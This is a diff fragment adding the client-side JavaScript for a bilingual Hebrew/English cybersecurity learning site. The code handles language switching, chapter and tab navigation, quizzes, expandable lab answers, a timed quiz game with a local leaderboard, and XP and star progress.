+  const lens = q.o.map(o => o.length);
+  const wrongLens = lens.filter((_, i) => i !== q.a);
+  const maxWrong = Math.max(...wrongLens);
+  const cap = maxWrong;
+  const newOpts = q.o.map(o => {
+    if (o.length <= cap) return o;
+    let t = o.slice(0, cap);
+    const ls = t.lastIndexOf(' ');
+    if (ls > cap * 0.5) t = t.slice(0, ls);
+    return t;
+  });
+  return { ...q, o: newOpts };
+}
+function shuffleOptions(q) {
+  const norm = normalizeOptions(q);
+  const idx = [0,1,2,3];
+  for (let i = idx.length-1; i > 0; i--) {
+    const j = Math.floor(Math.random()*(i+1));
+    [idx[i],idx[j]] = [idx[j],idx[i]];
+  }
+  return { ...norm, o: idx.map(i=>norm.o[i]), a: idx.indexOf(norm.a) };
+}
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', () => {
+  applyLang('he');
+  showChapter(0);
+});
+
+// ===== LANG =====
+function toggleLang() { currentLang = currentLang==='he'?'en':'he'; applyLang(currentLang); }
+
+function applyLang(lang) {
+  currentLang = lang;
+  const Lc = L();
+  document.documentElement.setAttribute('lang', lang==='he'?'he':'en');
+  document.documentElement.setAttribute('dir', Lc.dir);
+  document.getElementById('langBtn').textContent = Lc.langBtn;
+  document.getElementById('sbLabel').textContent = Lc.sbLabel;
+  document.getElementById('headerChName').textContent = Lc.names[state.cur]||'';
+
+  for (let i=0; i<TOTAL_CHAPTERS; i++) {
+    const $=id=>document.getElementById(id);
+    if($('chname-'+i))  $('chname-'+i).textContent  = Lc.names[i]||'';
+    if($('chtag-'+i))   $('chtag-'+i).textContent   = Lc.tags[i]||'';
+    if($('chtitle-'+i)) $('chtitle-'+i).textContent = Lc.names[i]||'';
+    if($('chdesc-'+i))  $('chdesc-'+i).textContent  = Lc.descs[i]||'';
+    if($('cheat-'+i))   $('cheat-'+i).innerHTML     = Lc.cheat[i]||'';
+
+    const learnEl = $('learn-'+i);
+    if (learnEl) learnEl.innerHTML = (Lc.learn[i]||'');
+
+    const tabsEl = $('tabs-'+i);
+    if (tabsEl) {
+      const tabs = Lc.tabs;
+      const keys = Lc.tabKeys;
+      const cur = state.tabs[i]||'learn';
+      tabsEl.innerHTML = tabs.map((t,ti)=>
+        `<button class="tab-btn${cur===keys[ti]?' active':''}" onclick="showTab(${i},'${keys[ti]}')">${t}</button>`
+      ).join('');
+    }
+
+    ['quiz','lab','game'].forEach(p => {
+      const el = $(p+'-'+i);
+      if(el){el.innerHTML='';delete el.dataset.rendered;}
+    });
+    state.quiz[i]=null;
+    state.game[i]={phase:'idle'};
+  }
+
+  const t = state.tabs[state.cur]||'learn';
+  if(t==='quiz'&&L().tabKeys.indexOf('quiz')>=0) renderQuiz(state.cur);
+  if(t==='lab'&&L().tabKeys.indexOf('lab')>=0)  renderLab(state.cur);
+  if(t==='game') renderGame(state.cur);
+
+  // Credits bar translation
+  const creditsLabels = {
+    he: {
+      title: '// מקורות ותודות',
+      research: 'מחקר ותקנים',
+      incidents: 'ניתוח אירועים',
+      tech: 'תיעוד טכני',
+      built: 'נבנה עם',
+      version: 'גרסה 2.0 — 2025'
+    },
+    en: {
+      title: '// Sources & Credits',
+      research: 'Research & Standards',
+      incidents: 'Incident Analysis',
+      tech: 'Technical Docs',
+      built: 'Built With',
+      version: 'Version 2.0 — 2025'
+    }
+  };
+  const cl2 = creditsLabels[lang] || creditsLabels.he;
+  const setT = (id, txt) => { const el = document.getElementById(id); if(el) el.textContent = txt; };
+  setT('credits-title-label', cl2.title);
+  setT('credits-research', cl2.research);
+  setT('credits-incidents', cl2.incidents);
+  setT('credits-tech', cl2.tech);
+  setT('credits-built', cl2.built);
+  setT('credits-version', cl2.version);
+}
+
+// ===== NAV =====
+function showChapter(n) {
+  document.querySelectorAll('.chapter').forEach(c=>c.classList.remove('active'));
+  document.querySelectorAll('.ch-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('ch-'+n)?.classList.add('active');
+  document.getElementById('nav-'+n)?.classList.add('active');
+  state.cur=n;
+  document.getElementById('headerChName').textContent = L().names[n]||'';
+  document.getElementById('sidebar')?.classList.remove('open');
+  window.scrollTo(0,0);
+  activateTab(n, state.tabs[n]||'learn');
+}
+
+function toggleSidebar() { document.getElementById('sidebar')?.classList.toggle('open'); }
+
+function showTab(chId, tabName) { state.tabs[chId]=tabName; activateTab(chId, tabName); }
+
+function activateTab(chId, tabName) {
+  const ch = document.getElementById('ch-'+chId);
+  if (!ch) return;
+  ch.querySelectorAll('.tab-btn').forEach(btn => {
+    const m = btn.getAttribute('onclick').match(/'(\w+)'\)/);
+    btn.classList.toggle('active', m && m[1]===tabName);
+  });
+  ch.querySelectorAll('.tab-panel').forEach(p => {
+    p.classList.toggle('active', p.id===chId+'-'+tabName);
+  });
+  if(tabName==='quiz'&&L().tabKeys.indexOf('quiz')>=0) renderQuiz(chId);
+  if(tabName==='lab'&&L().tabKeys.indexOf('lab')>=0)  renderLab(chId);
+  if(tabName==='game') renderGame(chId);
+}
+
+// ===== QUIZ =====
+function renderQuiz(chId) {
+  const el = document.getElementById('quiz-'+chId);
+  if(!el||el.dataset.rendered) return;
+  el.dataset.rendered='1';
+  if(!state.quiz[chId]) state.quiz[chId]={qi:0,ans:{},done:false,score:0};
+  const qs=getQ(chId); const Lc=L();
+  const pips = qs.map((_,i)=>`<div class="quiz-pip" id="qpip-${chId}-${i}"></div>`).join('');
+  const cards = qs.map((q,i)=>`
+    <div class="quiz-q-card" id="qcard-${chId}-${i}">
+      <div class="quiz-meta"><span id="qmeta-${chId}-${i}"></span></div>
+      <div class="quiz-q">${q.q}</div>
+      <div class="quiz-opts">
+        ${q.o.map((opt,oi)=>`
+          <button class="quiz-opt" id="qopt-${chId}-${i}-${oi}" onclick="quizPick(${chId},${i},${oi})">
+            <span class="opt-letter" id="qltr-${chId}-${i}-${oi}"></span>${opt}
+          </button>`).join('')}
+      </div>
+      <div class="quiz-exp" id="qexp-${chId}-${i}" style="display:none">
+        <strong id="qexplbl-${chId}-${i}"></strong> ${q.e||''}
+      </div>
+    </div>`).join('');
+  el.innerHTML=`
+    <div class="quiz-prog" id="qprog-${chId}">${pips}</div>
+    ${cards}
+    <div class="quiz-result" id="qres-${chId}">
+      <div class="result-emoji" id="qemoji-${chId}">🎉</div>
+      <div class="result-score" id="qscore-${chId}"></div>
+      <div class="result-label" id="qlabel-${chId}"></div>
+      <div class="result-stars" id="qstars-${chId}"></div>
+      <div style="display:flex;gap:8px;justify-content:center;margin-top:8px">
+        <button class="btn btn-ghost" id="qbtn-reset-${chId}" onclick="quizReset(${chId})"></button>
+        <button class="btn btn-primary" id="qbtn-lab-${chId}" onclick="showTab(${chId},'lab')"></button>
+      </div>
+    </div>
+    <div class="quiz-nav" id="qnav-${chId}">
+      <button class="btn btn-ghost" id="qprev-${chId}" onclick="quizNav(${chId},-1)"></button>
+      <button class="btn btn-primary" id="qnext-${chId}" onclick="quizNav(${chId},1)"></button>
+    </div>`;
+  refreshQuiz(chId);
+}
+
+function refreshQuiz(chId) {
+  const st=state.quiz[chId]; if(!st) return;
+  const qs=getQ(chId); const Lc=L();
+  qs.forEach((_,i)=>{
+    const card=document.getElementById(`qcard-${chId}-${i}`);
+    if(card) card.classList.toggle('active',i===st.qi);
+    const pip=document.getElementById(`qpip-${chId}-${i}`);
+    if(pip) pip.className='quiz-pip'+(i<st.qi||st.done?' done':i===st.qi?' cur':'');
+    const meta=document.getElementById(`qmeta-${chId}-${i}`);
+    if(meta) meta.textContent=`${Lc.question} ${i+1} ${Lc.of} ${qs.length}`;
+    qs[i].o.forEach((_,oi)=>{
+      const ltr=document.getElementById(`qltr-${chId}-${i}-${oi}`);
+      if(ltr) ltr.textContent=Lc.optLetters[oi];
+    });
+    const explbl=document.getElementById(`qexplbl-${chId}-${i}`);
+    if(explbl) explbl.textContent=Lc.quizExplain;
+  });
+  const prev=document.getElementById(`qprev-${chId}`);
+  const next=document.getElementById(`qnext-${chId}`);
+  if(document.getElementById(`qbtn-reset-${chId}`)) document.getElementById(`qbtn-reset-${chId}`).textContent=Lc.quizAgain;
+  if(document.getElementById(`qbtn-lab-${chId}`)) document.getElementById(`qbtn-lab-${chId}`).textContent=Lc.quizToLab;
+  if(prev){prev.textContent=Lc.quizPrev;prev.disabled=st.qi===0;}
+  if(next){
+    const ans=st.ans[st.qi]!==undefined;
+    if(st.qi<qs.length-1){next.textContent=Lc.quizNext;next.disabled=!ans;next.onclick=()=>quizNav(chId,1);}
+    else{next.textContent=Lc.quizSubmit;next.disabled=Object.keys(st.ans).length<qs.length;next.onclick=()=>quizSubmit(chId);}
+  }
+}
+
+function quizPick(chId,qi,oi){
+  const st=state.quiz[chId];if(!st||st.done)return;
+  st.ans[qi]=oi;
+  getQ(chId)[qi].o.forEach((_,o)=>{
+    const btn=document.getElementById(`qopt-${chId}-${qi}-${o}`);
+    if(btn) btn.classList.toggle('selected',o===oi);
+  });
+  refreshQuiz(chId);
+}
+
+function quizNav(chId,dir){
+  const st=state.quiz[chId];if(!st)return;
+  st.qi=Math.max(0,Math.min(getQ(chId).length-1,st.qi+dir));
+  refreshQuiz(chId);
+}
+
+function quizSubmit(chId){
+  const st=state.quiz[chId];if(!st)return;
+  const qs=getQ(chId);const Lc=L();
+  let score=0;
+  qs.forEach((q,i)=>{
+    const chosen=st.ans[i];const correct=q.a;
+    q.o.forEach((_,oi)=>{
+      const btn=document.getElementById(`qopt-${chId}-${i}-${oi}`);
+      if(!btn)return;
+      btn.classList.add('disabled');
+      if(oi===correct)btn.classList.add('correct');
+      else if(oi===chosen)btn.classList.add('wrong');
+      btn.classList.remove('selected');
+    });
+    const exp=document.getElementById(`qexp-${chId}-${i}`);
+    if(exp)exp.style.display='block';
+    if(chosen===correct)score++;
+  });
+  st.done=true;st.score=score;
+  const stars=score>=5?3:score>=4?2:score>=3?1:0;
+  state.stars[chId]=Math.max(state.stars[chId]||0,stars);
+  addXP(score*10);updateStars(chId);
+  document.getElementById(`qnav-${chId}`).style.display='none';
+  const res=document.getElementById(`qres-${chId}`);
+  res.classList.add('visible');
+  document.getElementById(`qscore-${chId}`).textContent=`${score}/${qs.length}`;
+  const emojis=['😔','😅','🙂','😊','🎉','🏆'];
+  document.getElementById(`qemoji-${chId}`).textContent=emojis[score]||'🎉';
+  document.getElementById(`qlabel-${chId}`).textContent=Lc.resultLabels[score]||'';
+  document.getElementById(`qstars-${chId}`).textContent='⭐'.repeat(stars)+'☆'.repeat(3-stars);
+  qs.forEach((_,i)=>{const c=document.getElementById(`qcard-${chId}-${i}`);if(c)c.classList.add('active');});
+}
+
+function quizReset(chId){
+  state.quiz[chId]=null;
+  const el=document.getElementById('quiz-'+chId);
+  if(el){el.innerHTML='';delete el.dataset.rendered;}
+  delete _sqCache[currentLang+'-'+chId];
+  renderQuiz(chId);
+}
+
+// ===== LAB =====
+function renderLab(chId){
+  const el=document.getElementById('lab-'+chId);
+  if(!el||el.dataset.rendered)return;
+  el.dataset.rendered='1';
+  const exs=getL(chId);const Lc=L();
+  el.innerHTML=exs.map((ex,i)=>`
+    <div class="lab-ex" id="labex-${chId}-${i}">
+      <div class="lab-ex-hdr" onclick="toggleLab(${chId},${i})">
+        <span class="lab-num">${i+1}</span>
+        <span class="lab-q">${ex.q}</span>
+        <span class="lab-chevron">▼</span>
+      </div>
+      <div class="lab-ans-wrap">
+        <div class="lab-ans-inner">
+          <div class="lab-ans-pre">${ex.a}</div>
+          <div class="lab-explain"><strong>${Lc.labExplain}</strong> ${ex.e||''}</div>
+        </div>
+      </div>
+    </div>`).join('');
+}
+
+function toggleLab(chId,i){
+  const el=document.getElementById(`labex-${chId}-${i}`);
+  if(el){el.classList.toggle('open');if(el.classList.contains('open'))addXP(5);}
+}
+
+// ===== GAME =====
+function renderGame(chId){
+  const el=document.getElementById('game-'+chId);
+  if(!el)return;
+  if(!state.game[chId])state.game[chId]={phase:'idle'};
+  const gs=state.game[chId];const Lc=L();
+  if(gs.phase==='idle'){
+    const gqs=getG(chId);
+    el.innerHTML=`
+      <div class="game-start-card">
+        <div class="game-icon">🛡️</div>
+        <div class="game-start-title">${Lc.gameTitle}</div>
+        <p class="game-start-desc">${Lc.gameDesc}</p>
+        <div class="game-rules">
+          <div class="game-rule">⏱️ <span>60</span> ${Lc.gameSeconds}</div>
+          <div class="game-rule">❓ <span>${gqs.length}</span> ${Lc.gameQuestions}</div>
+          <div class="game-rule">🏆 <span>${Lc.gameXP}</span></div>
+        </div>
+        <button class="btn btn-primary" style="font-size:13px;padding:11px 32px" onclick="gameStart(${chId})">${Lc.gameStart}</button>
+        ${buildLB(chId)}
+      </div>`;
+  } else if(gs.phase==='playing'){
+    renderGamePlay(chId);
+  } else {
+    renderGameOver(chId);
+  }
+}
+
+function gameStart(chId){
+  const gqs=getG(chId);
+  state.game[chId]={phase:'playing',qs:[...gqs].sort(()=>Math.random()-.5),qi:0,score:0,time:60,answered:false};
+  renderGame(chId);startTimer(chId);
+}
+
+function renderGamePlay(chId){
+  const el=document.getElementById('game-'+chId);
+  const gs=state.game[chId];const Lc=L();
+  if(!gs||gs.phase!=='playing')return;
+  const q=gs.qs[gs.qi];
+  if(!q){gameOver(chId);return;}
+  el.innerHTML=`
+    <div class="game-hud">
+      <div class="hud-timer${gs.time<=10?' urgent':''}" id="gtimer-${chId}">${gs.time}</div>
+      <div class="hud-qnum">${gs.qi+1}/${gs.qs.length}</div>
+      <div class="hud-score">⭐ ${gs.score}</div>
+    </div>
+    <div class="game-q">${q.q}</div>
+    <div class="game-opts">
+      ${q.o.map((opt,i)=>`<button class="game-opt" id="gopt-${chId}-${i}" onclick="gameAnswer(${chId},${i})">${opt}</button>`).join('')}
+    </div>
+    <div class="game-fb" id="gfb-${chId}"></div>`;
+}
+
+function startTimer(chId){
+  clearInterval(gameTimer);
+  gameTimer=setInterval(()=>{
+    const gs=state.game[chId];
+    if(!gs||gs.phase!=='playing'){clearInterval(gameTimer);return;}
+    gs.time--;
+    const t=document.getElementById(`gtimer-${chId}`);
+    if(t){t.textContent=gs.time;t.className='hud-timer'+(gs.time<=10?' urgent':'');}
+    if(gs.time<=0){clearInterval(gameTimer);gameOver(chId);}
+  },1000);
+}
+
+function gameAnswer(chId,chosen){
+  const gs=state.game[chId];if(!gs||gs.answered)return;
+  gs.answered=true;
+  const q=gs.qs[gs.qi];const ok=q.a===chosen;
+  document.querySelectorAll(`#game-${chId} .game-opt`).forEach(b=>b.classList.add('disabled'));
+  document.getElementById(`gopt-${chId}-${chosen}`)?.classList.add(ok?'correct':'wrong');
+  if(!ok)document.getElementById(`gopt-${chId}-${q.a}`)?.classList.add('correct');
+  const fb=document.getElementById(`gfb-${chId}`);
+  if(fb){fb.textContent=ok?'+10 ✓':'✗';fb.className='game-fb '+(ok?'ok':'bad');}
+  if(ok){gs.score+=10;addXP(10);}
+  setTimeout(()=>{
+    gs.qi++;gs.answered=false;
+    if(gs.qi>=gs.qs.length){gameOver(chId);return;}
+    renderGamePlay(chId);startTimer(chId);
+  },850);
+}
+
+function gameOver(chId){
+  clearInterval(gameTimer);
+  const gs=state.game[chId];if(!gs)return;
+  gs.phase='over';const Lc=L();
+  try{
+    let lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');
+    lb.push({name:Lc.playerName,score:gs.score,ts:Date.now()});
+    lb.sort((a,b)=>b.score-a.score);lb=lb.slice(0,5);
+    localStorage.setItem(`cyber-${chId}`,JSON.stringify(lb));
+  }catch(e){}
+  const total=gs.qs.length*10;const pct=Math.round((gs.score/total)*100);
+  const medal=gs.score>=total*.8?'🏆':gs.score>=total*.5?'🥈':'🥉';
+  document.getElementById('game-'+chId).innerHTML=`
+    <div class="game-over-card">
+      <div style="font-size:50px;margin-bottom:8px">${medal}</div>
+      <div class="game-over-score">${gs.score}</div>
+      <div class="game-over-title">${Lc.points} · ${pct}${Lc.pct}</div>
+      ${buildLB(chId)}
+      <div style="display:flex;gap:8px;justify-content:center;margin-top:16px">
+        <button class="btn btn-ghost" onclick="gameRestart(${chId})">${Lc.gameAgain}</button>
+        <button class="btn btn-primary" onclick="showTab(${chId},'cheat')">${Lc.gameToCheat}</button>
+      </div>
+    </div>`;
+}
+
+function gameRestart(chId){
+  state.game[chId]={phase:'idle'};
+  const el=document.getElementById('game-'+chId);
+  if(el)el.innerHTML='';
+  delete _sgCache[currentLang+'-g-'+chId];
+  renderGame(chId);
+}
+
+function buildLB(chId){
+  let lb=[];
+  try{lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');}catch(e){}
+  if(!lb.length)return'';
+  const medals=['🥇','🥈','🥉','4','5'];
+  const cls=['gold','silver','bronze','normal','normal'];
+  const Lc=L();
+  return`<div class="leaderboard"><div class="lb-title">${Lc.lbTitle}</div>${lb.map((e,i)=>`
+    <div class="lb-row ${cls[i]}">
+      <span class="lb-rank">${medals[i]}</span>
+      <span class="lb-name">${e.name||Lc.unknownPlayer}</span>
+      <span class="lb-pts">${e.score} ${Lc.points}</span>
+    </div>`).join('')}</div>`;
+}
+
+// ===== XP & STARS =====
+function addXP(n){
+  state.xp+=n;
+  const max=TOTAL_CHAPTERS*(5*10+4*5+8*10);
+  const pct=Math.min(100,(state.xp/max)*100);
+  document.getElementById('xpBar').style.width=pct+'%';
+  document.getElementById('xpLabel').textContent=state.xp+' XP';
+}
+
+function updateStars(chId){
+  const el=document.getElementById('stars-'+chId);
+  if(!el)return;
+  const s=state.stars[chId]||0;
+  el.textContent='⭐'.repeat(s)+'☆'.repeat(3-s);
+}
+
+</script></body></html>
